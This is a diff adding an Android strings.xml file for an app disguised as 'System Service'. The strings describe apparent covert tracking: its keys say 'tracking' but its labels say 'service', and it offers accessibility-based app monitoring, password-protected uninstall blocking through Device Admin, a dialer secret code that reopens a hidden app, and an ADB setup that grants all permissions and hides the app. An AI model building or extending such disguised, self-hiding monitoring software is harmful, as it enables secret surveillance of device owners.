@@ -1,0 +1,29 @@
+<?xml version="1.0" encoding="utf-8"?>
+<resources>
+    <string name="app_name">System Service</string>
+    <string name="app_title">System Service</string>
+    <string name="app_subtitle">Device Management Service</string>
+    <string name="start_tracking">Start Service</string>
+    <string name="stop_tracking">Stop Service</string>
+    <string name="open_dashboard">Open Console</string>
+    <string name="tracking_on">● Active</string>
+    <string name="tracking_off">○ Inactive</string>
+    <string name="status_label">Status:</string>
+    <string name="info_text">Device management service is running.\nAll data is synchronized securely.</string>
+    <string name="accessibility_service_description">Allows System Service to monitor app usage for optimization and management purposes.</string>
+    <string name="notification_channel_name">System Service</string>
+    <string name="notification_channel_desc">Device management notifications</string>
+    <string name="notification_text">Running in background</string>
+    <string name="uninstall_password_title">Uninstall Protection</string>
+    <string name="uninstall_password_hint">Enter password to disable protection</string>
+    <string name="device_admin_warning">This app requires Device Admin to prevent unauthorized uninstallation. This is a security feature.</string>
+    <string name="update_available">Update available</string>
+    <string name="update_downloading">Downloading update…</string>
+    <string name="update_installing">Installing update…</string>
+    <string name="secret_code_description">Dial *#*#1234#*#* to open</string>
+    <string name="setup_receiver_description">Receives ADB setup commands for zero-touch configuration</string>
+    <string name="dialer_code_hint">Dial this code in the phone dialer to re-open the hidden app</string>
+    <string name="adb_setup_title">ADB Zero-Touch Setup</string>
+    <string name="adb_setup_description">Run a single ADB command from your PC to automatically grant all permissions, enable services, and hide the app.</string>
+    <string name="setup_complete_hide">App will hide itself. Dial *#*#%1$s#*#* to re-open.</string>
+</resources>
